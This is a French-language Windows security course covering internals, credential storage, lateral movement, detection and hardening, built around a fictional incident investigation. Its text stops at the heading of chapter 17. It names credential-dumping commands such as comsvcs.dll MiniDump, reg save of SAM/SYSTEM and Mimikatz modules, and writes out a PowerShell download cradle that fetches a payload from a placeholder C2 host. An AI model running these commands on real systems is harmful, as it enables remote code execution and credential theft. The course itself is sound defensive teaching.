---
title: Windows
source: IT/02_Windows/Windows.md
---

*Architecture • Internals • Sécurité • Investigation*

**Cours complet — 31 chapitres • 7 parties • 7 annexes**

*Boot • Noyau • NTFS • Registre • Processus • Credentials • Réseau • Sécurité • Forensics*

---

### Table des matières

- [Fil rouge : Opération SHADOW](#fil-rouge-operation-shadow)
- **PARTIE I — ARCHITECTURE FONDAMENTALE (Ch.1-5)**
  - [Ch.1 — Vue d'ensemble de Windows](#chapitre-1-vue-densemble-de-windows)
  - [Ch.2 — Le processus de démarrage (boot process)](#chapitre-2-le-processus-de-demarrage-boot-process)
  - [Ch.3 — Noyau, mémoire et drivers](#chapitre-3-noyau-memoire-et-drivers)
  - [Ch.4 — Système de fichiers NTFS](#chapitre-4-systeme-de-fichiers-ntfs)
  - [Ch.5 — Registre Windows, hives et persistence](#chapitre-5-registre-windows-hives-et-persistence)
- **PARTIE II — PROCESSUS, EXÉCUTION ET CODE (Ch.6-10)**
  - [Ch.6 — Processus et threads : anatomie et arbre normal](#chapitre-6-processus-et-threads-anatomie-et-arbre-normal)
  - [Ch.7 — DLLs, services, WMI, COM et mécanismes d'exécution](#chapitre-7-dlls-services-wmi-com-et-mecanismes-dexecution)
  - [Ch.8 — Format PE et analyse statique](#chapitre-8-format-pe-et-analyse-statique)
  - [Ch.9 — Injection de code et techniques d'évasion](#chapitre-9-injection-de-code-et-techniques-devasion)
  - [Ch.10 — PowerShell : exécution, journalisation et investigation](#chapitre-10-powershell-execution-journalisation-et-investigation)
- **PARTIE III — CREDENTIALS ET AUTHENTIFICATION (Ch.11-13)**
  - [Ch.11 — Stockage des credentials : SAM, SYSTEM, LSASS, DPAPI](#chapitre-11-stockage-des-credentials-sam-system-lsass-dpapi)
  - [Ch.12 — Extraction de credentials : techniques SAM/SYSTEM/LSASS et détection](#chapitre-12-extraction-de-credentials-techniques-samsystemlsass-et-detection)
  - [Ch.13 — Protections des credentials et hardening](#chapitre-13-protections-des-credentials-et-hardening)
- **PARTIE IV — RÉSEAU ET COMMUNICATION (Ch.14-16)**
  - [Ch.14 — Stack réseau Windows et APIs](#chapitre-14-stack-reseau-windows-et-apis)
  - [Ch.15 — SMB, partages et accès distant](#chapitre-15-smb-partages-et-acces-distant)
  - [Ch.16 — Résolution de noms et protocoles dangereux](#chapitre-16-resolution-de-noms-et-protocoles-dangereux)
- **PARTIE V — MODÈLE DE SÉCURITÉ ET PROTECTIONS (Ch.17-20)**
  - [Ch.17 — Modèle de sécurité, intégrité et mitigations mémoire](#chapitre-17-modele-de-securite-integrite-et-mitigations-memoire)
  - [Ch.18 — Authentification locale et domaine](#chapitre-18-authentification-locale-et-domaine)
  - [Ch.19 — Privilèges, élévation et contrôle d'exécution](#chapitre-19-privileges-elevation-et-controle-dexecution)
  - [Ch.20 — Détection moderne : AMSI, ETW, EDR et BYOVD](#chapitre-20-detection-moderne-amsi-etw-edr-et-byovd)
- **PARTIE VI — EVENT LOGS, ARTEFACTS ET FORENSIC (Ch.21-26)**
  - [Ch.21 — Event Logs Windows](#chapitre-21-event-logs-windows)
  - [Ch.22 — Sysmon et télémétrie avancée](#chapitre-22-sysmon-et-telemetrie-avancee)
  - [Ch.23 — Artefacts forensic : exécution et persistence](#chapitre-23-artefacts-forensic-execution-et-persistence)
  - [Ch.24 — Artefacts forensic : fichiers, réseau et mémoire](#chapitre-24-artefacts-forensic-fichiers-reseau-et-memoire)
  - [Ch.25 — Investigation Windows : méthodologie structurée](#chapitre-25-investigation-windows-methodologie-structuree)
  - [Ch.26 — LOLBins, fileless et chaîne MotW→SmartScreen→ASR](#chapitre-26-lolbins-fileless-et-chaine-motwsmartscreenasr)
- **PARTIE VII — HARDENING, CAS DE SYNTHÈSE ET RÉFÉRENCE (Ch.27-31)**
  - [Ch.27 — Hardening Windows : P0/P1/P2](#chapitre-27-hardening-windows-p0-p1-p2)
  - [Ch.28 — Cas complet : investigation malware fileless (synthèse SHADOW)](#chapitre-28-cas-complet-investigation-malware-fileless-synthese-shadow)
  - [Ch.29 — Cas complet : analyse d'un ransomware pré-détonation](#chapitre-29-cas-complet-analyse-dun-ransomware-pre-detonation)
  - [Ch.30 — Cas complet : investigation mémoire avec Volatility](#chapitre-30-cas-complet-investigation-memoire-avec-volatility)
  - [Ch.31 — Arbre de processus normal Windows : la référence de détection](#chapitre-31-arbre-de-processus-normal-windows-la-reference-de-detection)
- **ANNEXES**

---

### Fil rouge : Opération SHADOW

> **Contexte narratif — ce fil rouge traverse les 26 premiers chapitres et se conclut au Ch.28.**
>
> **Léa Chen**, analyste SOC senior / IR chez **CyberShield** (MSSP, 60 personnes), est appelée pour investiguer un incident sur le SI de **Valtec Industries** — équipementier automobile, 1 800 collaborateurs, 2 sites (siège Toulouse, usine Valenciennes), Windows Server 2022 + postes Windows 11, AD on-prem, EDR CrowdStrike déployé.
>
> **L'alerte :** CrowdStrike détecte un processus `rundll32.exe` exécuté par `winword.exe` avec une commande suspecte, contactant une IP externe. L'arbre de processus est immédiatement anormal : `winword.exe` ne devrait JAMAIS lancer `rundll32.exe` (le parent normal de rundll32 est explorer.exe ou svchost.exe pour les opérations légitimes).
>
> L'investigation de Léa va traverser les 7 parties du cours — de l'architecture Windows (comprendre le normal pour détecter l'anormal) aux artefacts forensic (reconstituer la chronologie complète), en passant par les mécanismes d'exécution, les credentials, le réseau et les protections.

---

### PARTIE I — ARCHITECTURE FONDAMENTALE

*Comment Windows est construit, du boot au bureau — comprendre le normal pour détecter l'anormal.*

---

#### Chapitre 1 — Vue d'ensemble de Windows

##### 1.1 Pourquoi comprendre Windows en profondeur

En cybersécurité, Windows est partout : plus de 75 % des postes en entreprise, la quasi-totalité des environnements Active Directory, et la cible principale des malwares. On ne peut pas analyser un incident, investiguer un malware, ou hardener un poste si on ne comprend pas comment Windows fonctionne sous le capot. Ce cours n'est pas un cours d'administration classique — c'est un cours « comment Windows fonctionne réellement » avec un prisme sécurité permanent : chaque concept est relié à son exploitation ou sa défense.

##### 1.2 Historique et éditions

Windows repose sur le noyau NT, conçu en 1993. La lignée : NT 3.1 → NT 4.0 → 2000 → XP → Vista → 7 → 8 → 10 → 11. Côté serveur : Server 2003 → 2008 → 2012 → 2016 → 2019 → 2022 → 2025. Le noyau est fondamentalement le même entre les versions client et serveur d'une même génération. Les éditions et leurs différences sécurité : **Home** (pas de BitLocker, pas de GPO complète, pas de domain join, pas de Credential Guard), **Pro** (BitLocker, GPO locale, domain join, Hyper-V), **Enterprise** (Credential Guard, WDAC complet, AppLocker, Defender for Endpoint complet), **Server** (rôles AD DS, AD CS, DNS, DHCP, NPS — noyau identique à la version client).

##### 1.3 Architecture haut niveau : User mode vs Kernel mode

Windows sépare strictement deux niveaux d'exécution. **Ring 3 (User mode)** : les applications, les services, l'explorateur. Accès limité au matériel et à la mémoire. Un crash en user mode ne fait planter que le processus. **Ring 0 (Kernel mode)** : le noyau (ntoskrnl.exe), les drivers, le HAL. Accès total au matériel et à toute la mémoire. Un crash en kernel mode provoque un BSOD. Cette séparation est la base de la sécurité Windows : un processus utilisateur ne peut pas directement lire la mémoire d'un autre processus ou accéder au matériel — il doit passer par des appels système (syscalls) contrôlés par le noyau.

##### 1.4 Composants majeurs

**ntoskrnl.exe** (noyau — scheduler, memory manager, I/O manager, Security Reference Monitor — kernel mode), **hal.dll** (Hardware Abstraction Layer — kernel), **win32k.sys** (sous-système graphique — kernel), **csrss.exe** (Client/Server Runtime — gestion des sessions, consoles — user mode), **smss.exe** (Session Manager — premier processus user mode, lance csrss et wininit), **services.exe** (Service Control Manager/SCM — gère tous les services), **lsass.exe** (Local Security Authority — authentification, tokens, credentials — la cible n°1 de Mimikatz), **svchost.exe** (héberge les services partagés — plusieurs instances, chacune avec des services spécifiques identifiés par l'argument -k), **explorer.exe** (shell Windows — bureau, barre des tâches).

Pour l'analyste SOC, connaître ces composants et leur rôle est fondamental : un processus qui n'est pas dans cette liste, ou qui se comporte différemment de son rôle attendu, est potentiellement suspect.

##### 1.5 Object Manager et Security Reference Monitor

Windows gère toutes ses ressources comme des **objets** (processus, threads, fichiers, clés de registre, mutex, events, sections mémoire). L'Object Manager crée, gère et détruit ces objets. Chaque objet a un type, un nom (optionnel), un Security Descriptor (qui contrôle l'accès), et un reference count. Les **handles** sont les références qu'un processus obtient pour accéder à un objet. Le **Security Reference Monitor (SRM)** vérifie les droits à chaque création de handle : il compare le token du processus (son identité) avec la DACL de l'objet (ses permissions). Tout accès — fichier, registre, processus, réseau — passe par ce mécanisme.

##### 1.6 Outils Sysinternals

La suite Sysinternals (Microsoft, gratuite) est LA boîte à outils du professionnel Windows : **Process Explorer** (processus en détail — DLLs, handles, tokens, strings, VirusTotal), **Process Monitor** (capture en temps réel de toute l'activité fichiers/registre/réseau/processus), **Autoruns** (TOUS les points de persistence — services, drivers, Run keys, tasks, COM), **TCPView** (connexions réseau par processus en temps réel), **Handle** (handles ouverts par un processus), **Strings** (chaînes d'un binaire), **Sigcheck** (vérification des signatures numériques + VirusTotal), **WinObj** (espace de noms des objets kernel), **PsExec** (exécution à distance via SMB).

##### 1.7 Fil rouge — SHADOW : l'alerte

> **🔍 SHADOW — Épisode 1**
>
> Léa reçoit l'alerte CrowdStrike. Premier réflexe : vérifier l'arbre de processus. `winword.exe` (PID 4528) → `rundll32.exe` (PID 6712) — anormal. Le parent normal de rundll32 est explorer.exe ou svchost.exe, pas un processus Office. Le processus rundll32 contacte l'IP 185.220.xxx.xxx sur le port 443 — beaconing toutes les 60 secondes. Léa sait qu'elle regarde un accès initial via macro Word avec un C2 actif.

---

#### Chapitre 2 — Le processus de démarrage (boot process)

La séquence complète : (1) **Firmware UEFI** (POST, initialisation matérielle, recherche périphérique bootable), (2) **bootmgr** (lit le BCD, affiche le menu de boot), (3) **winload.exe** (charge ntoskrnl.exe, le HAL, les drivers boot-start, et le registre SYSTEM), (4) **ntoskrnl.exe** (initialise le noyau, lance smss.exe), (5) **smss.exe** (crée les sessions, lance csrss.exe + wininit.exe en session 0, csrss.exe + winlogon.exe en session 1), (6) **wininit.exe** (lance services.exe + lsass.exe), (7) **services.exe** (démarre tous les services auto-start), (8) **winlogon.exe** (écran de logon), (9) **explorer.exe** (après authentification — bureau, shell utilisateur).

**UEFI vs BIOS legacy** (GPT vs MBR, Secure Boot). Le **Secure Boot** vérifie la signature de chaque composant de boot — protection contre les bootkits. Le **Measured Boot + TPM** enregistre les mesures d'intégrité dans les PCR du TPM — attestation à distance. Le **BCD** (Boot Configuration Data — bcdedit.exe).

La **persistence pré-OS** : bootkits (TDL4, Rovnix, **BlackLotus** — UEFI bootkit 2023 qui contourne Secure Boot), drivers boot-start, implants firmware (LoJax/APT28, CosmicStrand — persistent même après réinstallation OS), modification BCD. Un malware pré-OS est quasi invisible pour l'EDR (qui s'exécute après le boot). La **persistence post-boot** : services auto-start, drivers, scheduled tasks, Run/RunOnce registre, Winlogon, startup folders — visible mais noyée dans le légitime → Autoruns les liste toutes.

---

#### Chapitre 3 — Noyau, mémoire et drivers

La séparation user/kernel appliquée par le processeur (rings x86). Le **syscall** : quand un programme appelle CreateFile(), la requête traverse ntdll.dll (user mode) → syscall → ntoskrnl.exe (kernel mode) → I/O Manager → driver → disque. L'**espace d'adressage virtuel** (128 To sur x64 — partie basse = user space propre à chaque processus, partie haute = kernel space partagé — isolation mémoire). La **mémoire virtuelle** (pages 4 Ko, page tables, pagefile.sys — peut contenir des credentials et du code malveillant → artefact forensic, working set).

Le noyau **ntoskrnl.exe** (Scheduler — threads sur les cœurs CPU, Memory Manager — mémoire virtuelle et pagefile, I/O Manager — entrées/sorties via drivers, Object Manager — tous les objets kernel, Security Reference Monitor — vérifie les droits). Les **drivers** (kernel mode ring 0, accès total — un driver malveillant = contrôle complet du système ; **driver signing obligatoire** sauf en mode test ; **HVCI** — Hypervisor-Protected Code Integrity — bloque les drivers non signés même avec admin, basé sur VBS — Virtualization-Based Security). Les **mini-filter drivers** (interception des opérations I/O — c'est ainsi que les antivirus scannent les fichiers en temps réel et que les EDR surveillent l'activité disque).

---

#### Chapitre 4 — Système de fichiers NTFS

NTFS est le système de fichiers de Windows — journal, permissions, compression, chiffrement EFS. La **MFT** (Master File Table) contient un enregistrement par fichier/dossier, même supprimé récemment → artefact forensic majeur (MFTECmd — Eric Zimmerman). Les **timestamps MACB** (Modified, Accessed, Changed, Birth) existent en 2 copies : $STANDARD_INFORMATION (modifiable par l'utilisateur) et $FILE_NAME (modifiable uniquement par le noyau) — les attaquants modifient $SI mais pas $FN → l'analyse comparée détecte le **timestomping**.

Les **Alternate Data Streams** (ADS — données cachées dans un flux alternatif du même fichier). Le plus important : **Zone.Identifier** = le **Mark of the Web (MotW)** — quand un fichier est téléchargé depuis Internet ou reçu par email, Windows écrit la source dans un ADS Zone.Identifier. Ce MotW déclenche toute la chaîne de protection : SmartScreen → Office Protected View → restrictions de macros → ASR rules (Ch.26). Les malwares stockent parfois du code dans des ADS pour le dissimuler.

Le **$UsnJrnl** (journal des modifications — création, suppression, renommage — artefact forensic pour la timeline). Les permissions NTFS (ACL sur les fichiers et dossiers, héritage, droits effectifs). L'EFS (Encrypting File System — chiffrement par fichier, clé de l'utilisateur).

---

#### Chapitre 5 — Registre Windows, hives et persistence

Le registre est la base de données hiérarchique de configuration de Windows. Les **hives** : **SAM** (comptes locaux — hashes NTLM), **SECURITY** (secrets LSA — mots de passe de services, clés de chiffrement), **SOFTWARE** (configuration des applications et de l'OS), **SYSTEM** (configuration hardware, services, drivers — contient la boot key qui déchiffre SAM), **NTUSER.DAT** (par utilisateur — configuration personnelle, persistence par utilisateur).

Les **clés de persistence** — les emplacements où un malware s'inscrit pour survivre au redémarrage : **Run/RunOnce** (HKLM et HKCU — exécution au logon), **Services** (HKLM\SYSTEM\CurrentControlSet\Services — exécution par SCM), **Winlogon Shell/Userinit** (détournement du processus de logon), **AppInit_DLLs** (DLL chargée dans tout processus qui charge user32.dll — vecteur d'injection global), **IFEO** (Image File Execution Options — permet de rediriger l'exécution d'un exe vers un autre = hijack), **COM Objects CLSID** (détournement de l'appel COM vers une DLL malveillante — COM Hijacking), **Boot Execute** (programmes exécutés par smss.exe au boot — rare mais très discret).

Le registre comme source forensic : la dernière modification d'une clé = timestamp exploitable. Outils : RECmd, Registry Explorer (Eric Zimmerman). Les protections : clés protégées par ACL, WRP (Windows Resource Protection).

---

### PARTIE II — PROCESSUS, EXÉCUTION ET CODE

*Comment le code s'exécute, se charge et se dissimule — le terrain de jeu des malwares.*

---

#### Chapitre 6 — Processus et threads : anatomie et arbre normal

##### 6.1 Anatomie d'un processus

Un processus Windows est constitué de : son **PEB** (Process Environment Block — informations sur le processus : chemin de l'image, command line, variables d'environnement, DLLs chargées), son espace d'adressage virtuel, ses handles (références aux objets kernel), son **token d'accès** (identité — SID de l'utilisateur, groupes, privilèges), et ses threads (unités d'exécution). La création passe par CreateProcess → NtCreateProcess → le noyau crée les structures. **PID** (Process ID) et **PPID** (Parent PID) identifient le processus et son parent — le PPID est fondamental pour reconstruire l'arbre.

##### 6.2 L'arbre de processus normal — la baseline de détection

Connaître l'arbre normal est le fondement de la détection comportementale (développé en détail au Ch.31). L'essentiel : **System** (PID 4) → **smss.exe** → **csrss.exe** (session 0) + **wininit.exe** → **services.exe** → **svchost.exe** (multiples instances). En parallèle : **csrss.exe** (session 1) + **winlogon.exe** → **userinit.exe** → **explorer.exe** → applications utilisateur.

Pour chaque processus critique, l'analyste vérifie 4 choses : le **parent attendu** (svchost.exe doit être enfant de services.exe — si son parent est explorer.exe ou cmd.exe, c'est suspect), le **chemin d'image attendu** (svchost.exe doit être dans C:\Windows\System32 — un svchost.exe dans C:\Users\... est un malware qui se fait passer pour un processus légitime), le **nombre d'instances attendu** (lsass.exe = 1 seule instance — 2 lsass.exe = le second est probablement malveillant), et le **contexte utilisateur attendu** (services.exe s'exécute sous SYSTEM — s'il s'exécute sous un compte utilisateur, c'est anormal).

**svchost.exe** mérite une attention particulière : chaque instance légitime héberge un ou plusieurs services identifiés par l'argument **-k** dans la command line (svchost.exe -k netsvcs, svchost.exe -k LocalService). Un svchost.exe sans argument -k, ou avec un argument -k inhabituel, est suspect. Sur Windows 10/11, chaque service a tendance à avoir son propre svchost.exe (séparation pour la fiabilité) — le nombre d'instances est donc élevé (30-60+) mais chacune a des arguments et un service identifiables.

##### 6.3 PPID Spoofing

Un attaquant peut forger le PPID via CreateProcess avec PROC_THREAD_ATTRIBUTE_PARENT_PROCESS — le processus malveillant semble être un enfant d'un processus légitime (svchost.exe, explorer.exe) au lieu de cmd.exe ou powershell.exe. Détection : Sysmon Event 1 enregistre le PPID réel et le ParentImage — la comparaison avec les ETW ou les logs de création de processus du noyau peut révéler l'incohérence.

##### 6.4 Fil rouge — SHADOW : l'arbre anormal

> **🔍 SHADOW — Épisode 2**
>
> Léa examine l'arbre de processus complet de la machine compromise dans CrowdStrike. L'anomalie est claire : `winword.exe` (parent : explorer.exe — normal) → `rundll32.exe` (parent : winword.exe — anormal, le parent normal de rundll32 pour les opérations légitimes est explorer.exe ou svchost.exe). De plus, un `svchost.exe` (PID 8240) s'exécute avec le parent `rundll32.exe` — doublement anormal : svchost.exe devrait toujours être enfant de services.exe. Ce svchost.exe n'a pas d'argument -k et son image path est C:\Windows\System32\svchost.exe mais son image en mémoire ne correspond pas (Process Hollowing — Ch.9).

---

#### Chapitre 7 — DLLs, services, WMI, COM et mécanismes d'exécution

Les **DLLs** (Dynamic Link Libraries — code partagé entre processus). Le **DLL Search Order** (le répertoire de l'application d'abord, puis System32, puis Windows, puis le PATH → **DLL Hijacking** si un attaquant place une DLL malveillante dans un répertoire prioritaire). Les **Known DLLs** (cache kernel des DLLs système protégées contre le hijacking — HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs).

Les **services Windows** (gérés par SCM — services.exe). Types : Win32OwnProcess (son propre processus), Win32ShareProcess (hébergé dans svchost.exe). Un service malveillant avec StartType=Auto = persistence au reboot. Event 7045 = nouveau service installé — signal de détection. Les **scheduled tasks** (Task Scheduler — persistence via tâche au logon/boot ; Event 4698 = tâche créée). Les **COM Objects** (Component Object Model — modèle d'interaction entre composants ; **COM Hijacking** = détournement via modification du CLSID dans le registre — le processus charge la DLL de l'attaquant au lieu du composant légitime).

Le **WMI** (Windows Management Instrumentation — framework d'administration) : requêtage (wmic, Get-WmiObject), exécution à distance (wmic process call create "cmd.exe"), et **WMI Event Subscriptions** comme persistence (FilterToConsumerBinding — un événement déclenche l'exécution d'un script ou d'un binaire ; extrêmement discret ; détection : Sysmon Events 19/20/21). Le **BITS** (Background Intelligent Transfer Service — transferts en arrière-plan, utilisable comme canal de téléchargement discret et persistence — bitsadmin, Event BITS).

---

#### Chapitre 8 — Format PE et analyse statique

Le format **PE** (Portable Executable — structure commune à .exe, .dll, .sys, .scr). La structure : DOS Header (signature MZ) → PE Header → Optional Header (entry point, image base, subsystem) → Section Table → Sections (.text = code, .data = données, .rdata = imports/exports read-only, .rsrc = ressources). L'**Import Address Table** (IAT — les fonctions importées depuis d'autres DLLs ; les imports suspects : VirtualAlloc, WriteProcessMemory, CreateRemoteThread, NtCreateThreadEx → injection de code ; URLDownloadToFileA → téléchargement ; WinExec, ShellExecute → exécution ; CryptEncrypt → ransomware potentiel). L'**Export Table** (fonctions exportées par une DLL).

Les **strings** (chaînes de caractères dans le binaire — URLs C2, commandes, clés de registre, chemins — Strings de Sysinternals ou FLOSS pour les strings obfusquées). L'**entropy** (mesure du « désordre » dans les sections — une entropy élevée > 7 indique du packing ou du chiffrement — les sections .text légitimes ont une entropy de 5-6). Le **packing** (UPX, Themida, VMProtect — le code est compressé/chiffré, décompressé au runtime ; signaux : peu d'imports visibles, forte entropy, sections avec des noms inhabituels). Les **signatures numériques** (Authenticode — un binaire signé par un éditeur légitime est plus fiable ; les certificats volés ou frauduleux sont utilisés par les APT — Stuxnet, SolarWinds ; vérification : sigcheck, Get-AuthenticodeSignature).

Fil rouge : Léa analyse le payload téléchargé par la macro Word — une DLL avec une forte entropy dans .text (packing), des imports suspects (VirtualAlloc, NtCreateThreadEx), et pas de signature Authenticode.

---

#### Chapitre 9 — Injection de code et techniques d'évasion

*Les techniques que les malwares modernes utilisent pour exécuter du code dans un autre processus et échapper à la détection.*

Le **Process Injection classique** : OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread — l'attaquant alloue de la mémoire dans un processus légitime, y écrit du shellcode, et crée un thread pour l'exécuter. Le code malveillant s'exécute dans le contexte du processus cible (svchost.exe, explorer.exe) et hérite de sa réputation. Le **DLL Injection** (charger une DLL malveillante via CreateRemoteThread + LoadLibrary, SetWindowsHookEx, ou QueueUserAPC). Le **Process Hollowing** (créer un processus légitime en état suspendu, vider sa mémoire via NtUnmapViewOfSection, remplacer par du code malveillant via WriteProcessMemory, puis reprendre le thread — le processus semble légitime dans le Task Manager mais exécute du code malveillant). Le **Reflective DLL Loading** (charger une DLL en mémoire sans écrire de fichier sur disque et sans appeler LoadLibrary — la DLL se mappe elle-même via son propre loader ; aucun fichier .dll sur le disque → très discret).

Le **PPID Spoofing** (CreateProcess avec PPID forgé — Ch.6). Les **syscalls directs** (appeler directement les fonctions kernel — NtAllocateVirtualMemory au lieu de VirtualAllocEx — pour contourner les hooks EDR en user mode ; les EDR hook les fonctions ntdll.dll en user mode → les syscalls directs sautent par-dessus ces hooks).

La **détection** : Sysmon Event 8 (CreateRemoteThread — processus source → processus cible), Event 10 (ProcessAccess — accès à la mémoire d'un autre processus), Event 25 (ProcessTampering — image file hollowing), ETW Microsoft-Windows-Threat-Intelligence provider. Les EDR hook les fonctions user mode pour détecter ces techniques — les syscalls directs et le BYOVD (Ch.20) contournent ces défenses.

Fil rouge : le malware de Valtec utilise du Process Hollowing — un processus svchost.exe avec un PID suspect s'exécute avec services.exe comme parent (PPID Spoofing) mais son image en mémoire ne correspond pas à son image sur disque.

---

#### Chapitre 10 — PowerShell : exécution, journalisation et investigation

*PowerShell est à la fois l'outil le plus puissant pour l'investigation et le vecteur d'attaque le plus courant.*

PowerShell comme **vecteur d'attaque** : download cradles (IEX(New-Object Net.WebClient).DownloadString('http://c2/payload')), encodage base64 (powershell -enc [base64]), bypass de la politique d'exécution (-ExecutionPolicy Bypass), **AMSI bypass** (les attaquants patachent amsi.dll en mémoire pour désactiver le scan avant exécution — Ch.20), **fileless** (le code est exécuté en mémoire sans jamais toucher le disque — Invoke-ReflectivePEInjection, Invoke-Mimikatz).

La **journalisation PowerShell** — les 3 niveaux de défense : **Script Block Logging** (Event 4104 — enregistre TOUT le code exécuté après désobfuscation, y compris après AMSI bypass — la source de détection n°1), **Module Logging** (Event 4103 — enregistre les appels de modules avec les paramètres), **Transcription** (enregistre tout l'input/output dans un fichier texte — le plus complet mais le plus volumineux). Les 3 niveaux doivent être activés par GPO.

PowerShell pour l'**investigation** : commandes de triage (Get-Process, Get-Service, Get-ScheduledTask, Get-NetTCPConnection, Get-WinEvent — filtrage par Event ID et TimeCreated, Get-ItemProperty registre — clés Run/Services, Get-ChildItem C:\Windows\Prefetch). Fil rouge : Léa examine les logs PowerShell — Event 4104 montre le code déobfusqué du payload : téléchargement via certutil, DLL déposée dans %TEMP%, exécution via rundll32, puis injection en mémoire.

---

### PARTIE III — CREDENTIALS ET AUTHENTIFICATION

*Où sont les secrets, comment ils sont volés, et comment les protéger.*

---

#### Chapitre 11 — Stockage des credentials : SAM, SYSTEM, LSASS, DPAPI

Le **SAM** (Security Account Manager — hashes NTLM des comptes locaux, chiffré avec la boot key stockée dans SYSTEM ; SAM sans SYSTEM = coffre sans clé). Le **NTDS.dit** (base AD sur les DC — hashes de TOUS les comptes du domaine — renvoi cours AD). La **mémoire lsass.exe** (le processus d'authentification — contient en mémoire les tickets Kerberos, hashes NTLM, et parfois mots de passe en clair si WDigest activé ; c'est ce que Mimikatz extrait via sekurlsa::logonpasswords). Les **LSA Secrets** (HKLM\SECURITY\Policy\Secrets — mots de passe des comptes de service en clair, clés de chiffrement, mot de passe machine). Le **DPAPI** (Data Protection API — chiffre les secrets utilisateur : mots de passe Chrome/Edge, credentials WiFi, Vault ; la master key est dérivée du mot de passe de l'utilisateur ; la domain backup key sur les DC déchiffre TOUTES les master keys du domaine). Les **DCC2** (Domain Cached Credentials — hash dérivé du MdP domaine, mis en cache pour le login offline — par défaut les 10 derniers logons ; crackable avec hashcat -m 2100, plus lent que NTLM mais faisable). Les **GPP** (Group Policy Preferences — cpassword chiffré avec une clé publiée par Microsoft → déchiffrement trivial ; corrigé MS14-025 mais les GPP historiques restent souvent).

---

#### Chapitre 12 — Extraction de credentials : techniques SAM/SYSTEM/LSASS et détection

L'extraction **SAM + SYSTEM** : reg save (commande native — admin local, Event 4688 command line), Volume Shadow Copy (plus discrète), backup wbadmin (offline), accès physique/Live USB (hors OS), Mimikatz lsadump::sam (détecté par EDR/AV). L'extraction **NTDS.dit** : ntdsutil, VSS, DCSync (renvoi cours AD). Le **dump mémoire LSASS** — 7 techniques avec traces et détection : Task Manager (Sysmon 10, fichier .dmp), comsvcs.dll (LoLBin — rundll32 comsvcs.dll,MiniDump, Sysmon 10 + 4688), procdump (Sysmon 10), Mimikatz sekurlsa::logonpasswords (signature AV, behavior EDR), nanodump/dumpert (contournement EDR — plus difficile à détecter), duplication de handle (subtil), et SSP injection (DLL chargée dans lsass — Sysmon 7). Ce qu'on trouve dans un dump LSASS : hashes NTLM (toujours sauf Credential Guard), tickets Kerberos (si session domaine), MdP en clair (si WDigest activé — UseLogonCredential=1), clés DPAPI master keys. Les LSA Secrets (secretsdump, Mimikatz lsadump::secrets — mots de passe de services en clair). Le DPAPI (master key déchiffrée avec le hash NTLM → accès Chrome/WiFi/Vault). Les DCC2 (secretsdump, Mimikatz lsadump::cache).

La **détection** : Sysmon 10 sur lsass.exe (processus source inhabituel), 4688/Sysmon 1 command line reg save sur hives sensibles, 7036+4688 VSS suspecte, Sysmon 7 DLL chargée dans lsass, Sysmon 13 modification registre SSP, Event 4662 pour DCSync.

---

#### Chapitre 13 — Protections des credentials et hardening

**Credential Guard** (VBS — Virtualization-Based Security — isole les hashes NTLM + tickets Kerberos hors de lsass dans un environnement virtuel protégé par l'hyperviseur ; Mimikatz ne peut plus les extraire ; ne protège PAS les DCC2, ni SAM, ni LSA Secrets). **RunAsPPL** (Protected Process Light — protège lsass contre les injections de processus non protégés ; contournable avec un driver signé ou exploit kernel — moins fort que Credential Guard mais plus compatible). Désactiver WDigest (UseLogonCredential=0 — par défaut depuis 2012 R2, vérifier). **LAPS** (mot de passe admin local unique et roté par machine — élimine le PtH via admin local identique sur tout le parc). **Remote Credential Guard** (les credentials ne sont pas envoyées au serveur RDP — protection contre le dump sur le serveur de destination). **Protected Users** (groupe AD — pas de cache NTLM, pas de délégation, TGT 4h — renvoi cours AD). Réduire les DCC2 (GPO Interactive logon: Number of previous logons to cache = 1 ou 0). **BitLocker** (chiffrement disque — protège SAM/SYSTEM/NTDS.dit contre l'accès offline via Live USB ou vol de disque).

---

### PARTIE IV — RÉSEAU ET COMMUNICATION

---

#### Chapitre 14 — Stack réseau Windows et APIs

L'architecture réseau (Winsock → AFD.sys → TCP/IP stack → NDIS → driver réseau). Le **WFP** (Windows Filtering Platform — framework de filtrage sur lequel repose le Windows Firewall et certains EDR). Les APIs réseau (WinHTTP, WinINet — les APIs que les malwares utilisent pour communiquer ; URLDownloadToFile, HttpOpenRequest → détection par API monitoring et Sysmon 3). Le **firewall Windows** (profils Domain/Private/Public, règles entrantes/sortantes — un firewall host correctement configuré limite le mouvement latéral et bloque le C2 sortant sur les ports non standards). Les connexions réseau (netstat -anob, Get-NetTCPConnection, TCPView — ce que l'investigateur vérifie en premier lors du triage : quels processus communiquent avec quelles IP ?).

---

#### Chapitre 15 — SMB, partages et accès distant

SMB (Server Message Block — port 445). Les versions : SMBv1 = EternalBlue → **désactiver immédiatement**, SMBv2 minimum, SMBv3 chiffré recommandé. Les partages administratifs (C$, ADMIN$, IPC$ — accessibles par les admins locaux → vecteur de mouvement latéral). Les techniques d'accès distant et leur profil de détection : **PsExec** (crée un service temporaire PSEXESVC — Event 7045 + 4624 type 3 + Sysmon 1 avec psexesvc.exe en child de services.exe), **WMI** (Event 4624 type 3 + 4688 avec parent wmiprvse.exe sur la cible), **WinRM** (PowerShell Remoting — Event 4624 type 3 + 4688 wsmprovhost.exe), **RDP** (Event 4624 type 10 — connexion interactive à distance), **DCOM** (appel COM à distance — mmc.exe, excel.exe comme parent de processus suspect), **schtasks** (tâche planifiée à distance — Event 4698 sur la cible). Chaque technique a un profil de détection différent — connaître ces profils est une compétence SOC fondamentale.

---

#### Chapitre 16 — Résolution de noms et protocoles dangereux

DNS (résolution normale, DNS cache — artefact forensic volatil, DNS query logging — Sysmon 22). Les protocoles de fallback dangereux : **LLMNR** (Link-Local Multicast Name Resolution — port 5355, broadcast — Responder capture les hashes NTLM → désactiver par GPO), **NBT-NS** (NetBIOS Name Service — port 137 — même risque → désactiver), **mDNS** (Multicast DNS — port 5353). **WPAD** (Web Proxy Auto-Discovery — le client cherche un serveur proxy via DHCP puis DNS puis LLMNR → l'attaquant se déclare proxy et intercepte le trafic → désactiver par GPO). Fil rouge : LLMNR et NBT-NS sont actifs sur le réseau de Valtec, mais dans ce cas l'accès initial est par phishing — Léa note la vulnérabilité dans ses recommandations.

---

### PARTIE V — MODÈLE DE SÉCURITÉ ET PROTECTIONS

---

#### Chapitre 17 — Modèle de sécurité, intégrité et mitigations mémoire

##### 17.1 Le Security Reference Monitor

